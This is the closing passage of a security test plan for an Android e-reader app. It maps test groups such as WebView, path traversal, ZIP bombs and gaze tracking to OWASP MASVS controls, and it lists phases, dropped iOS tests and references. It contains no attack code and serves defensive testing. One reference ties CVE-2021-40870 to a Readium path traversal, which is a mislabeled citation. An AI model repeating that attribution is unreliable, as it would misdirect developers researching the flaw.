| G — AuDHD-first safety regressions | 7 | ✅ G.1, G.2, G.3 (Sprint 17), G.5 (×2), G.6, G.7 JVM; 🔴 G.4 instrumented |
| H — Android platform security | 6 | 🔴 All new |
| I — Kotlin coroutines / dispatcher safety | 5 | ✅ I.1–I.5 JVM |
| J — Gaze tracking pipeline | 6 | ✅ J.1–J.6 (J.2, J.6 JVM proxies; J.4 production fix + test) |
| **Total** | **58** | **58 new** |

---

## MASVS coverage summary

| Code | Name | Sections |
|---|---|---|
| MASVS-STORAGE-1 | Data stored securely | B.2–B.5, C.1–C.5, D.1–D.5, J.1, J.3 |
| MASVS-STORAGE-2 | Sensitive data not logged/shared | D.3, E.2, J.2 |
| MASVS-CRYPTO-1 | Cryptography / file protection | D.5 |
| MASVS-NETWORK-1 | Secure network communication | A.2, D.2, F.3, F.5, H.1–H.2 |
| MASVS-PLATFORM-1 | Secure WebView / component use | A.1–A.5, E.3, H.3, J.4 |
| MASVS-PLATFORM-2 | No unintended data exposure | A.2, E.1–E.2, H.5–H.6 |
| MASVS-PLATFORM-3 | URL scheme / Intent security | A.3, H.4 |
| MASVS-CODE-3 | Thread / concurrency safety | C.3, I.1–I.5 |
| MASVS-CODE-4 | Memory / parser / resource safety | A.6, B.1–B.2, J.5 |
| MASVS-CODE-5 | Dependency hygiene | F.1–F.6 |

---

## Implementation priority

### Phase 1 — Before Reader PR 1 merges
- A.1 (JS in Android WebView — highest risk in Readium integration)
- A.2 (external resource loading)
- A.3 (intent:// scheme injection — Android-specific, high risk)
- A.6 (malformed EPUB parser crash)
- B.3 (path traversal in zip4j / CBZ)
- B.4 (path traversal in Readium / EPUB)
- F.1 (version pins confirmed)
- J.1 (iris UV never persisted — regression guard)
- J.2 (iris UV never logged — regression guard)

### Phase 2 — Before library V2
- A.4, A.5 (CSS/SVG injection)
- B.1, B.2 (ZIP bombs — EPUB and CBZ)
- B.6, B.7 (type validation, duplicate books)
- C.1–C.5 (migration, concurrency, cascade delete)
- D.2 (D2D transfer design decision)
- H.1 (network security config — defense in depth)
- H.2 (INTERNET permission unused — consider removing)
- I.3 ✅ (TTS race — covered)

### Phase 3 — Before public beta
- All remaining: E ✅, G ✅, H.3–H.6 ✅, I.4–I.5 ✅, J.2–J.6 ✅, F.2–F.3 ✅; still open (runtime-only): F.5

---

## Removed from iOS doc (not applicable to Android V1)

| iOS test | Reason removed |
|---|---|
| CloudKit sync conflict tests (C.1–C.5 iOS) | No cloud sync in Android V1 |
| iCloud exposure tests (D.1–D.4 iOS) | No iCloud |
| Swift Package checksum (F.4 iOS) | Gradle, not SPM |
| NSFileProtection levels (H.3 iOS) | Android uses different file protection model |
| Swift 6 actor isolation tests (I.1–I.3 iOS) | Kotlin coroutines replace |
| WKContentRuleList tests | Android WebView uses different interception API |
| AVSpeechSynthesizer specifics | Android TTS engine is different |

---

## References

| Resource | URL |
|---|---|
| OWASP MASVS v2 | https://mas.owasp.org/MASVS/ |
| OWASP MSTG (Android section) | https://mas.owasp.org/MASTG/Android/ |
| EPUB3 Security Considerations (W3C) | https://www.w3.org/TR/epub-33/#sec-security-privacy |
| CVE-2021-40870 (Readium path traversal) | https://nvd.nist.gov/vuln/detail/CVE-2021-40870 |
| Android WebView security | https://developer.android.com/guide/webapps/webview |
| Android Network Security Config | https://developer.android.com/training/articles/security-config |
| Android Data Extraction Rules | https://developer.android.com/guide/topics/data/autobackup |
| CWE-22 Path Traversal | https://cwe.mitre.org/data/definitions/22.html |
| CWE-409 ZIP bomb (CWE-409) | https://cwe.mitre.org/data/definitions/409.html |
| zip4j documentation | https://github.com/srikanth-lingala/zip4j |
| MediaPipe Tasks Vision | https://ai.google.dev/edge/mediapipe/solutions/vision/face_landmarker/android |
| Room database security | https://developer.android.com/training/data-storage/room |
